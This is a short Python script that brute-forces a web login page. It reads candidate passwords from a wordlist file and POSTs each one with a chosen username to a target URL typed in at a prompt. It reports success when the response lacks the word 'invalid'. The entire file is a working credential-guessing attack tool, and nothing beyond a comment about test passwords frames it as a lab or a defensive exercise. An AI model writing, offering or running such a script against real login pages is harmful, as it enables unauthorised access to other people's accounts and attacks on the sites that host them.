import requests

def brute_force_login(target_url, username, wordlist):
    """Attempts to brute-force a login page using a wordlist."""
    with open(wordlist, "r") as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()
        data = {"username": username, "password": password}  # Modify based on form fields
        response = requests.post(target_url, data=data)

        if "invalid" not in response.text.lower():  # Modify condition based on response
            print(f"✅ SUCCESS! Password found: {password}")
            return

        print(f"❌ Attempt failed: {password}")

    print("⚠️ No valid password found.")

# Example usage
target_url = input("Enter the target login URL: ")
username = input("Enter the username: ")
wordlist = "passwords.txt"  # Create this file with test passwords

brute_force_login(target_url, username, wordlist)
